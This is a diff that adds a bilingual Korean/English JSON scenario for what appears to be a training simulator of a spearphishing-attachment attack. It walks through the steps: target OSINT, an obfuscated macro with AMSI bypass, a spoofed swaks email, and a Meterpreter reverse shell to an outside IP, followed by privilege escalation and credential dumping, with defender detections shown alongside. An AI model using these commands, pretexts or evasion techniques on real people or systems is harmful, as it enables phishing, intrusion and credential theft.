@@ -1,0 +1,237 @@
+{
+  "id": "T1566.001",
+  "title": "스피어피싱 첨부파일 공격 시뮬레이션",
+  "titleEn": "Spearphishing Attachment Simulation",
+  "duration": 12,
+  "phases": [
+    { "label": "🔍 타겟 정찰", "labelEn": "🔍 Target Recon", "steps": [0] },
+    { "label": "⚡ 무기화", "labelEn": "⚡ Weaponization", "steps": [1, 2] },
+    { "label": "📧 전달 및 실행", "labelEn": "📧 Delivery & Execution", "steps": [3, 4] },
+    { "label": "🔓 권한 상승 및 수집", "labelEn": "🔓 Escalation & Collection", "steps": [5, 6] }
+  ],
+  "topoNodes": [
+    { "id": "ext", "label": "Attacker", "x": 50, "y": 60 },
+    { "id": "email", "label": "Email Server", "x": 200, "y": 30 },
+    { "id": "pc", "label": "Victim PC", "x": 200, "y": 90 },
+    { "id": "c2", "label": "C2 Server", "x": 350, "y": 60 },
+    { "id": "dc", "label": "Domain Controller", "x": 500, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "ext", "to": "email", "minStep": 3 },
+    { "from": "email", "to": "pc", "minStep": 4 },
+    { "from": "pc", "to": "c2", "minStep": 4 },
+    { "from": "pc", "to": "dc", "minStep": 6 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "{companyName} Data", "icon": "📁" },
+    { "name": "CloudSec2024_Slides.docm", "icon": "📄", "alert": true },
+    { "name": "Outlook", "icon": "📧" }
+  ],
+  "steps": [
+    {
+      "cmd": "python3 target_recon.py --employee \"{userName}\" --company \"{companyName}\" --output dossier.json",
+      "out": "[+] Gathering intelligence on {userName}@{companyName}.com...\n\nTarget Profile:\n  Name: {userName}\n  Role: Security Engineer\n  Department: IT Security\n  Manager: Kim Soyeon (CISO)\n  Recent activity: Attended CloudSec Conference 2024\n  LinkedIn interests: Cloud Security, DevSecOps\n  Email pattern: first.last@{companyName}.com\n\n[+] Pretext recommendation: Conference follow-up email\n[+] Dossier saved to dossier.json",
+      "def": "[OSINT Monitor] Targeted intelligence gathering detected for {userName}@{companyName}.com",
+      "defAction": "Source: Digital footprint monitoring\nTarget: {userName} personal information\nAction: Employee notified of potential targeting",
+      "desc": "타겟 직원의 공개 정보를 수집하여 맞춤형 피싱 이메일의 구실(pretext)을 준비합니다.",
+      "descEn": "The attacker gathers open-source intelligence on the target employee to craft a convincing pretext for the phishing email.",
+      "stepTitle": "타겟 직원 정보 수집",
+      "stepTitleEn": "Target Employee Intelligence Gathering",
+      "feynman": "맞춤 양복을 만들려면 치수를 재야 하듯, 맞춤형 피싱 이메일을 만들려면 타겟의 정보가 필요합니다. SNS에서 최근 참석한 컨퍼런스(CloudSec 2024), 관심 분야(Cloud Security), 상사 이름까지 수집합니다. 이 정보로 '컨퍼런스 후속 이메일'이라는 완벽한 구실을 만듭니다.",
+      "feynmanEn": "Like a tailor needing measurements for a custom suit, crafting a targeted phishing email requires target information. Recent conference attendance (CloudSec 2024), interests (Cloud Security), and manager's name are collected from social media. This creates the perfect pretext: a 'conference follow-up email.'",
+      "expert": "OSINT 기반 타겟 프로파일링으로, LinkedIn 활동 분석, 컨퍼런스 참석 이력, 조직 구조를 종합합니다. 'Conference follow-up'은 시간적 관련성이 높은 프리텍스트로 피싱 성공률을 크게 높입니다.",
+      "expertEn": "OSINT-based target profiling combining LinkedIn activity analysis, conference attendance history, and organizational structure. 'Conference follow-up' is a time-relevant pretext that significantly increases phishing success rates.",
+      "defTooltip": "🔍 OSINT 모니터: 특정 직원을 대상으로 한 표적 정보 수집이 감지되었습니다",
+      "defTooltipEn": "🔍 OSINT Monitor: Targeted intelligence gathering detected for specific employee",
+      "hackerLog": {
+        "title": "dossier.json",
+        "lines": [
+          { "log": "Recent activity: Attended CloudSec Conference 2024", "desc": "💡 최근 컨퍼런스 참석 정보 - 피싱 이메일의 완벽한 구실이 됩니다" },
+          { "log": "Manager: Kim Soyeon (CISO)", "desc": "💡 상사 이름을 알면 '상사의 지시'라는 프리텍스트도 사용할 수 있습니다" },
+          { "log": "Pretext recommendation: Conference follow-up email", "desc": "💡 자동으로 가장 효과적인 피싱 구실을 추천합니다" }
+        ]
+      },
+      "terms": [
+        { "name": "Dossier (도시에)", "desc": "특정 인물에 대해 수집한 정보를 정리한 파일. 사회공학 공격에서 타겟의 약점과 관심사를 파악하는 데 사용됩니다" },
+        { "name": "Pretext (프리텍스트)", "desc": "사회공학에서 사용하는 거짓 구실이나 시나리오. 타겟이 의심 없이 행동하게 만드는 설득력 있는 이야기입니다" }
+      ]
+    },
+    {
+      "cmd": "python3 macro_builder.py --type vba --payload reverse_shell --obfuscation heavy --output malicious_macro.vba",
+      "out": "[+] Building obfuscated VBA macro...\n[+] Payload: PowerShell reverse shell (staged)\n[+] Obfuscation layers:\n    1. String concatenation + Chr() encoding\n    2. Variable name randomization\n    3. Control flow obfuscation\n    4. WMI-based execution (no cmd.exe)\n    5. Auto_Open trigger\n\n[+] Execution chain:\n    Document Open → VBA Macro → WMI → PowerShell (hidden)\n    → Download Stage 2 from cdn-static.{companyName}-corp.com\n    → Execute in memory (fileless)\n\n[+] Macro saved: malicious_macro.vba (12KB)\n[+] AMSI bypass: Included (patching amsi.dll in memory)",
+      "def": "[Sandbox] Heavily obfuscated VBA macro with WMI execution and AMSI bypass detected",
+      "defAction": "Source: Automated malware analysis\nTarget: malicious_macro.vba\nAction: Macro signature added to detection rules, YARA rule created",
+      "desc": "다중 난독화를 적용한 VBA 매크로를 생성합니다. WMI를 통해 cmd.exe 없이 실행됩니다.",
+      "descEn": "The attacker creates a heavily obfuscated VBA macro that executes via WMI without spawning cmd.exe.",
+      "stepTitle": "난독화 VBA 매크로 생성",
+      "stepTitleEn": "Obfuscated VBA Macro Creation",
+      "feynman": "VBA 매크로는 Word/Excel에서 자동으로 실행되는 프로그램입니다. 5겹의 난독화로 보안 분석을 어렵게 만들고, cmd.exe 대신 WMI를 사용하여 탐지를 우회합니다. 문서를 열면 자동으로(Auto_Open) 실행되어 메모리에서만 동작하므로 디스크에 흔적이 남지 않습니다.",
+      "feynmanEn": "VBA macros are programs that auto-execute in Word/Excel. Five layers of obfuscation make security analysis difficult, and using WMI instead of cmd.exe evades detection. When the document opens, Auto_Open triggers execution entirely in memory, leaving no traces on disk.",
+      "expert": "5단계 난독화: 문자열 연결+Chr() 인코딩, 변수명 랜덤화, 제어흐름 난독화, WMI 실행(cmd.exe 프로세스 트리 회피), Auto_Open 트리거. AMSI 바이패스(amsi.dll 메모리 패칭)로 스크립트 검사를 무력화하고 파일리스(fileless) 실행으로 디스크 포렌식을 회피합니다.",
+      "expertEn": "5-layer obfuscation: string concatenation+Chr() encoding, variable name randomization, control flow obfuscation, WMI execution (avoiding cmd.exe process tree), Auto_Open trigger. AMSI bypass (amsi.dll memory patching) disables script inspection, and fileless execution evades disk forensics.",
+      "defTooltip": "🔬 샌드박스: WMI 실행과 AMSI 우회가 포함된 고도 난독화 VBA 매크로 감지",
+      "defTooltipEn": "🔬 Sandbox: Heavily obfuscated VBA macro with WMI execution and AMSI bypass detected",
+      "hackerLog": {
+        "title": "macro_builder.log",
+        "lines": [
+          { "log": "4. WMI-based execution (no cmd.exe)", "desc": "💡 cmd.exe를 사용하지 않아 '문서→cmd.exe' 탐지 규칙을 우회합니다" },
+          { "log": "→ Execute in memory (fileless)", "desc": "💡 파일을 디스크에 저장하지 않아 백신 스캔에 걸리지 않습니다" },
+          { "log": "[+] AMSI bypass: Included", "desc": "💡 Windows의 스크립트 검사 기능(AMSI)을 무력화합니다" }
+        ]
+      },
+      "terms": [
+        { "name": "VBA Macro", "desc": "Microsoft Office에서 실행되는 Visual Basic 프로그램. 업무 자동화용이지만 악성 코드 실행에 악용되어 많은 기업에서 기본 비활성화합니다" },
+        { "name": "Fileless (파일리스)", "desc": "디스크에 파일을 저장하지 않고 메모리에서만 실행되는 공격 방식. 전통적인 백신의 파일 스캔을 완전히 우회합니다" }
+      ]
+    },
+    {
+      "cmd": "python3 doc_builder.py --template conference_agenda.docx --macro malicious_macro.vba --decoy cloudsec_slides.pdf",
+      "out": "[+] Building weaponized document...\n[+] Template: CloudSec Conference 2024 Agenda\n[+] Macro injection: Auto_Open (hidden module)\n[+] Decoy behavior: Shows real conference slides when opened\n[+] Document metadata:\n    Author: CloudSec Conference Committee\n    Company: CloudSec Foundation\n    Created: 2024-03-10\n    Modified: 2024-03-12\n\n[+] Social engineering elements:\n    - \"Enable Content\" prompt styled as document protection\n    - Yellow info bar: \"This document is protected. Click Enable Content to view.\"\n\n[+] Output: CloudSec2024_Exclusive_Slides.docm (856KB)\n[+] File hash: a3f2...8b91",
+      "def": "[Email Security] Macro-enabled document detected with embedded Auto_Open trigger",
+      "defAction": "Source: Email gateway sandboxing\nTarget: CloudSec2024_Exclusive_Slides.docm\nAction: Attachment stripped, sender flagged",
+      "desc": "실제 컨퍼런스 자료처럼 보이는 미끼 문서에 악성 매크로를 삽입합니다.",
+      "descEn": "The attacker embeds the malicious macro into a decoy document that appears to be legitimate conference material.",
+      "stepTitle": "무기화된 문서 제작",
+      "stepTitleEn": "Weaponized Document Creation",
+      "feynman": "진짜 컨퍼런스 발표 자료처럼 보이는 문서를 만들고, 그 안에 악성 매크로를 숨깁니다. 메타데이터도 'CloudSec Conference Committee'로 조작하고, 열면 실제 슬라이드가 보입니다. '콘텐츠 사용' 버튼을 누르면 매크로가 실행되는데, 마치 문서 보호를 해제하는 것처럼 꾸며져 있습니다.",
+      "feynmanEn": "A document that looks like real conference slides is created with a malicious macro hidden inside. Metadata is faked as 'CloudSec Conference Committee,' and opening it shows actual slides. Clicking 'Enable Content' triggers the macro, disguised as unlocking document protection.",
+      "expert": "무기화된 문서는 합법적 템플릿에 난독화된 VBA를 주입합니다. 문서 메타데이터 조작(Author, Company, 날짜)으로 출처를 위장하고, 디코이 콘텐츠로 사용자의 의심을 해소합니다. 'Enable Content' 사회공학은 Microsoft의 보안 경고를 역이용합니다.",
+      "expertEn": "The weaponized document injects obfuscated VBA into a legitimate template. Document metadata manipulation (Author, Company, dates) disguises the origin, and decoy content alleviates suspicion. The 'Enable Content' social engineering exploits Microsoft's security warnings.",
+      "defTooltip": "📎 이메일 보안: Auto_Open 트리거가 포함된 매크로 문서가 감지되었습니다",
+      "defTooltipEn": "📎 Email Security: Macro-enabled document with Auto_Open trigger detected",
+      "hackerLog": {
+        "title": "doc_builder.log",
+        "lines": [
+          { "log": "Author: CloudSec Conference Committee", "desc": "💡 문서 메타데이터를 조작하여 컨퍼런스 공식 문서처럼 보이게 합니다" },
+          { "log": "\"This document is protected. Click Enable Content to view.\"", "desc": "💡 사용자가 매크로를 활성화하도록 유도하는 사회공학 메시지입니다" },
+          { "log": "Decoy behavior: Shows real conference slides when opened", "desc": "💡 실제 슬라이드가 보여서 사용자가 정상 문서라고 믿습니다" }
+        ]
+      },
+      "terms": [
+        { "name": "Weaponized Document", "desc": "악성 코드가 삽입된 문서 파일. 정상적인 문서처럼 보이지만 열면 악성 코드가 실행됩니다" },
+        { "name": "Enable Content", "desc": "Microsoft Office의 매크로 실행 버튼. 기본적으로 매크로는 비활성화되어 있지만, 사용자가 이 버튼을 클릭하면 실행됩니다" }
+      ]
+    },
+    {
+      "cmd": "swaks --to {userName}@{companyName}.com --from speaker@cloudsec-conf.org --header \"Subject: [CloudSec 2024] 비공개 발표자료 공유\" --body email_body.html --attach CloudSec2024_Exclusive_Slides.docm --server mail.{companyName}-corp.com",
+      "out": "=== Trying mail.{companyName}-corp.com:587...\n=== Connected to mail.{companyName}-corp.com.\n=== EHLO\n=== AUTH LOGIN\n=== MAIL FROM:<speaker@cloudsec-conf.org>\n=== RCPT TO:<{userName}@{companyName}.com>\n=== DATA\n\nFrom: CloudSec Conference <speaker@cloudsec-conf.org>\nTo: {userName}@{companyName}.com\nSubject: [CloudSec 2024] 비공개 발표자료 공유\nContent-Type: multipart/mixed\n\n[HTML Body]: 안녕하세요 {userName}님, CloudSec 2024에서 만나뵙게 되어...\n[Attachment]: CloudSec2024_Exclusive_Slides.docm (856KB)\n\n=== Message sent successfully\n=== SPF: PASS | DKIM: PASS | DMARC: PASS",
+      "def": "[Email Gateway] Spearphishing email detected - macro-enabled attachment from spoofed conference domain",
+      "defAction": "Source: Email security gateway\nTarget: {userName}@{companyName}.com\nAction: Email quarantined, attachment detonated in sandbox, user notified",
+      "desc": "컨퍼런스 발표자를 사칭하여 대상 직원에게 악성 첨부파일이 포함된 이메일을 발송합니다.",
+      "descEn": "The attacker sends the phishing email impersonating a conference speaker, with the weaponized document attached.",
+      "stepTitle": "스피어피싱 이메일 발송",
+      "stepTitleEn": "Spearphishing Email Delivery",
+      "feynman": "모든 준비가 끝나고 미끼가 달린 낚시줄을 던지는 순간입니다. 컨퍼런스 발표자를 사칭하여 '비공개 발표자료'라는 제목으로 이메일을 보냅니다. SPF, DKIM, DMARC 모두 통과하여 스팸함이 아닌 받은편지함에 도착합니다. 최근 참석한 컨퍼런스라서 의심할 이유가 없습니다.",
+      "feynmanEn": "All preparation is complete, and now the baited hook is cast. Impersonating a conference speaker, the email is sent with 'exclusive slides' as the subject. SPF, DKIM, and DMARC all pass, landing in the inbox. Since the target recently attended the conference, there's no reason for suspicion.",
+      "expert": "swaks를 사용한 SMTP 기반 이메일 전달로, From 헤더를 사칭하고 SPF/DKIM/DMARC 인증을 통과합니다. multipart/mixed 형식으로 HTML 본문과 .docm 첨부파일을 전송합니다. 컨퍼런스 프리텍스트는 시간적 연관성으로 높은 오픈율을 보장합니다.",
+      "expertEn": "SMTP-based email delivery via swaks, spoofing the From header and passing SPF/DKIM/DMARC. multipart/mixed format delivers HTML body with .docm attachment. The conference pretext ensures high open rates through temporal relevance.",
+      "defTooltip": "📧 이메일 게이트웨이: 사칭된 컨퍼런스 도메인에서 매크로 첨부파일 감지",
+      "defTooltipEn": "📧 Email Gateway: Macro-enabled attachment from spoofed conference domain detected",
+      "hackerLog": {
+        "title": "swaks_delivery.log",
+        "lines": [
+          { "log": "Subject: [CloudSec 2024] 비공개 발표자료 공유", "desc": "💡 실제 참석한 컨퍼런스 이름을 사용하여 의심을 최소화합니다" },
+          { "log": "SPF: PASS | DKIM: PASS | DMARC: PASS", "desc": "💡 모든 이메일 인증을 통과하여 받은편지함에 정상 도착합니다" },
+          { "log": "=== Message sent successfully", "desc": "💡 피싱 이메일 전달 성공 - 이제 피해자의 클릭을 기다립니다" }
+        ]
+      },
+      "terms": [
+        { "name": "swaks (Swiss Army Knife for SMTP)", "desc": "SMTP 프로토콜 테스트 도구. 이메일 발송, 인증 테스트, 헤더 조작 등을 위한 다목적 커맨드라인 도구입니다" },
+        { "name": "Email Spoofing", "desc": "이메일 발신자를 사칭하는 기법. From 헤더를 조작하여 다른 사람이 보낸 것처럼 위장합니다" }
+      ]
+    },
+    {
+      "cmd": "# [Victim Action] {userName} opens document and clicks 'Enable Content'",
+      "out": "[Victim Workstation - {userName}]\n> Document opened: CloudSec2024_Exclusive_Slides.docm\n> User clicked: \"Enable Content\" button\n> Macro executing...\n\n[Macro Execution Log]:\n1. Auto_Open() triggered\n2. WMI process created (wmiprvse.exe)\n3. PowerShell spawned (hidden window)\n4. AMSI bypass: amsi.dll patched in memory\n5. Stage 2 download: cdn-static.{companyName}-corp.com/update.ps1\n6. Payload loaded in memory (fileless)\n7. Reverse HTTPS connection established → 185.220.101.34:443\n\n[+] Meterpreter session 1 opened",
+      "def": "[EDR] Suspicious process chain: WINWORD.EXE → wmiprvse.exe → powershell.exe (hidden)",
+      "defAction": "Source: CrowdStrike Falcon\nTarget: {userName}'s workstation (DESKTOP-SEC01)\nAction: Process killed, endpoint quarantined, IR ticket #INC-2024-0334 created",
+      "desc": "피해자가 매크로를 활성화하면 WMI를 통해 PowerShell이 실행되고 C2 연결이 수립됩니다.",
+      "descEn": "When the victim enables macros, PowerShell executes via WMI and establishes a C2 connection.",
+      "stepTitle": "매크로 실행 및 C2 연결 수립",
+      "stepTitleEn": "Macro Execution and C2 Connection",
+      "feynman": "피해자가 '콘텐츠 사용'을 클릭하는 순간, 문서 뒤에서 연쇄 반응이 시작됩니다. 매크로→WMI→PowerShell→다운로드→메모리 실행→C2 연결. 이 모든 과정이 눈에 보이지 않게 진행됩니다. 피해자는 정상적인 발표 자료를 보고 있지만, 이미 컴퓨터는 공격자의 손에 넘어갔습니다.",
+      "feynmanEn": "The moment the victim clicks 'Enable Content,' a chain reaction starts behind the document. Macro→WMI→PowerShell→download→memory execution→C2 connection. All happens invisibly. The victim sees normal slides while their computer is already in the attacker's hands.",
+      "expert": "공격 체인: WINWORD.EXE → WMI Provider Host(wmiprvse.exe) → PowerShell(-w hidden). AMSI 패칭 후 Stage 2를 다운로드하여 메모리에서 실행합니다. Meterpreter reverse HTTPS 세션이 포트 443으로 수립되며, 정상 HTTPS 트래픽과 구분이 어렵습니다.",
+      "expertEn": "Attack chain: WINWORD.EXE → WMI Provider Host (wmiprvse.exe) → PowerShell (-w hidden). After AMSI patching, Stage 2 is downloaded and executed in memory. Meterpreter reverse HTTPS session establishes on port 443, indistinguishable from normal HTTPS traffic.",
+      "defTooltip": "🚨 EDR: 의심스러운 프로세스 체인 감지 - WINWORD→wmiprvse→powershell",
+      "defTooltipEn": "🚨 EDR: Suspicious process chain detected - WINWORD→wmiprvse→powershell",
+      "hackerLog": {
+        "title": "macro_execution.log",
+        "lines": [
+          { "log": "2. WMI process created (wmiprvse.exe)", "desc": "💡 cmd.exe 대신 WMI를 사용하여 '문서→cmd.exe' 탐지 규칙을 회피합니다" },
+          { "log": "4. AMSI bypass: amsi.dll patched in memory", "desc": "💡 Windows의 스크립트 검사 기능을 무력화하여 악성 스크립트가 실행됩니다" },
+          { "log": "[+] Meterpreter session 1 opened", "desc": "💡 공격자가 피해자 PC를 원격 제어할 수 있는 세션이 열렸습니다" }
+        ]
+      },
+      "terms": [
+        { "name": "Meterpreter", "desc": "Metasploit의 고급 페이로드. 메모리에서 실행되며 파일 탐색, 스크린샷, 키로깅, 권한 상승 등 다양한 기능을 제공합니다" },
+        { "name": "AMSI (Anti-Malware Scan Interface)", "desc": "Windows의 스크립트/매크로 검사 인터페이스. PowerShell, VBA 등의 코드를 실행 전 백신에 검사 요청하지만, 패칭으로 우회가 가능합니다" }
+      ]
+    },
+    {
+      "cmd": "meterpreter> sysinfo && getuid && getsystem",
+      "out": "Computer        : DESKTOP-SEC01\nOS              : Windows 10 Pro (Build 19045)\nArchitecture    : x64\nSystem Language : ko_KR\nDomain          : {companyName}.LOCAL\nLogged On Users : 2\nMeterpreter     : x64/windows\n\nServer username: {companyName}\\{userName}\n\n[+] ...attempting token manipulation...\n[+] ...using technique: Named Pipe Impersonation (In Memory)...\n[-] Attempt failed: Access Denied\n[+] ...using technique: Token Duplication...\n[+] ...got SYSTEM via Token Duplication!\n\nServer username: NT AUTHORITY\\SYSTEM",
+      "def": "[EDR] Privilege escalation detected: {userName} → NT AUTHORITY\\SYSTEM via token manipulation",
+      "defAction": "Source: Endpoint detection\nTarget: DESKTOP-SEC01\nAction: SYSTEM-level process terminated, full memory dump captured for forensics",
+      "desc": "Meterpreter 세션에서 토큰 조작을 통해 SYSTEM 권한으로 권한 상승을 시도합니다.",
+      "descEn": "The attacker attempts privilege escalation to SYSTEM via token manipulation in the Meterpreter session.",
+      "stepTitle": "SYSTEM 권한 상승",
+      "stepTitleEn": "SYSTEM Privilege Escalation",
+      "feynman": "일반 사용자 권한에서 컴퓨터의 '신(神)' 권한인 SYSTEM으로 올라가는 단계입니다. 토큰 복제(Token Duplication)라는 기법으로, 이미 SYSTEM 권한으로 실행 중인 프로세스의 '출입증'을 복사합니다. 마치 관리자의 사원증을 복사하여 통제 구역에 들어가는 것과 같습니다.",
+      "feynmanEn": "This step elevates from regular user to the computer's 'god' privileges - SYSTEM. Token Duplication copies the 'access badge' from a process already running as SYSTEM. Like copying an admin's employee badge to enter restricted areas.",
+      "expert": "getsystem은 다중 권한 상승 기법을 시도합니다. Named Pipe Impersonation이 실패하자 Token Duplication으로 전환합니다. Token Duplication은 DuplicateTokenEx()로 SYSTEM 토큰을 복제한 후 ImpersonateLoggedOnUser()로 적용합니다.",
+      "expertEn": "getsystem attempts multiple privilege escalation techniques. When Named Pipe Impersonation fails, it switches to Token Duplication, which uses DuplicateTokenEx() to clone a SYSTEM token and ImpersonateLoggedOnUser() to apply it.",
+      "defTooltip": "⬆️ EDR: 토큰 조작을 통한 SYSTEM 권한 상승이 감지되었습니다",
+      "defTooltipEn": "⬆️ EDR: Privilege escalation to SYSTEM via token manipulation detected",
+      "hackerLog": {
+        "title": "meterpreter_session.log",
+        "lines": [
+          { "log": "Domain: {companyName}.LOCAL", "desc": "💡 도메인 참가 PC - Active Directory 네트워크의 일부로 횡적 이동이 가능합니다" },
+          { "log": "[-] Named Pipe Impersonation: Access Denied", "desc": "💡 첫 번째 기법 실패 - 자동으로 다른 기법을 시도합니다" },
+          { "log": "[+] ...got SYSTEM via Token Duplication!", "desc": "💡 SYSTEM 획득! 이제 컴퓨터에서 모든 작업이 가능합니다" }
+        ]
+      },
+      "terms": [
+        { "name": "SYSTEM (NT AUTHORITY\\SYSTEM)", "desc": "Windows의 최고 권한 계정. 운영체제 커널 수준의 모든 작업을 수행할 수 있으며, 관리자(Administrator)보다도 높은 권한입니다" },
+        { "name": "Token Duplication", "desc": "Windows 접근 토큰을 복제하는 기법. 높은 권한의 프로세스 토큰을 복사하여 자신의 권한을 상승시킵니다" }
+      ]
+    },
+    {
+      "cmd": "meterpreter> hashdump && run post/windows/gather/credentials/credential_collector",
+      "out": "[+] Dumping password hashes...\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::\n{userName}:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\nservice_admin:1002:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::\n\n[+] Credential Collector Results:\n  Windows Credentials: 5\n  Browser passwords: 12 (Chrome)\n  WiFi passwords: 3\n  RDP saved credentials: 2\n    - dc01.{companyName}.local ({companyName}\\admin_backup)\n    - fileserver.{companyName}.local ({companyName}\\{userName})\n\n[+] Credentials saved to /root/loot/",
+      "def": "[SIEM] Credential dumping detected: SAM database accessed, browser credential stores read",
+      "defAction": "Source: EDR + SIEM correlation\nTarget: DESKTOP-SEC01 credential stores\nAction: Forced password reset for all affected accounts, domain-wide credential rotation initiated",
+      "desc": "SYSTEM 권한으로 SAM 데이터베이스와 브라우저에 저장된 자격증명을 수집합니다.",
+      "descEn": "With SYSTEM privileges, the attacker dumps the SAM database and collects credentials stored in browsers.",
+      "stepTitle": "자격증명 수집 및 덤프",
+      "stepTitleEn": "Credential Dumping and Collection",
+      "feynman": "SYSTEM 권한으로 컴퓨터에 저장된 모든 비밀번호를 훔치는 단계입니다. Windows SAM 데이터베이스에서 계정 해시를, Chrome 브라우저에서 저장된 비밀번호 12개를, RDP 저장 인증에서 도메인 컨트롤러 접속 정보까지 수집합니다. 이 정보로 다른 서버에도 접근할 수 있게 됩니다.",
+      "feynmanEn": "With SYSTEM privileges, the attacker steals all passwords stored on the computer. Account hashes from SAM database, 12 saved passwords from Chrome, and RDP credentials for the domain controller. This information enables access to other servers.",
+      "expert": "hashdump은 SAM 데이터베이스에서 NTLM 해시를 추출합니다. credential_collector는 DPAPI를 통해 Chrome 자격증명 저장소, Windows Credential Manager, RDP 저장 인증을 수집합니다. DC에 대한 RDP 자격증명 발견은 횡적 이동의 핵심 벡터입니다.",
+      "expertEn": "hashdump extracts NTLM hashes from the SAM database. credential_collector uses DPAPI to collect Chrome credential stores, Windows Credential Manager, and RDP saved credentials. Discovering DC RDP credentials is a critical lateral movement vector.",
+      "defTooltip": "🔑 SIEM: SAM 데이터베이스 접근 및 브라우저 자격증명 추출이 감지되었습니다",
+      "defTooltipEn": "🔑 SIEM: SAM database access and browser credential extraction detected",
+      "hackerLog": {
+        "title": "credential_dump.log",
+        "lines": [
+          { "log": "Administrator:500:...e19ccf75ee54e06b06a5907af13cef42", "desc": "💡 관리자 계정의 NTLM 해시 탈취 - Pass-the-Hash 공격에 사용할 수 있습니다" },
+          { "log": "Browser passwords: 12 (Chrome)", "desc": "💡 Chrome에 저장된 12개 비밀번호 탈취 - 내부 시스템 접근 가능" },
+          { "log": "dc01.{companyName}.local ({companyName}\\admin_backup)", "desc": "💡 도메인 컨트롤러 접속 정보 발견! 전체 도메인 장악의 열쇠입니다" }
+        ]
+      },
+      "terms": [
+        { "name": "SAM (Security Account Manager)", "desc": "Windows의 로컬 계정 정보를 저장하는 데이터베이스. 사용자 이름과 비밀번호 해시가 저장되어 있습니다" },
+        { "name": "NTLM Hash", "desc": "Windows 비밀번호의 해시값. 원래 비밀번호를 몰라도 이 해시만으로 인증(Pass-the-Hash)이 가능합니다" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "WINWORD.EXE", "depth": 0, "alert": false, "minStep": 4 },
+    { "name": "wmiprvse.exe (PID: 8901)", "depth": 1, "alert": true, "minStep": 4 },
+    { "name": "powershell.exe -hidden (PID: 8934)", "depth": 2, "alert": true, "minStep": 4 },
+    { "name": "meterpreter (in-memory)", "depth": 3, "alert": true, "minStep": 5 },
+    { "name": "lsass.exe (accessed)", "depth": 3, "alert": true, "minStep": 6 },
+    { "name": "chrome.exe (credential read)", "depth": 3, "alert": true, "minStep": 6 }
+  ]
+}
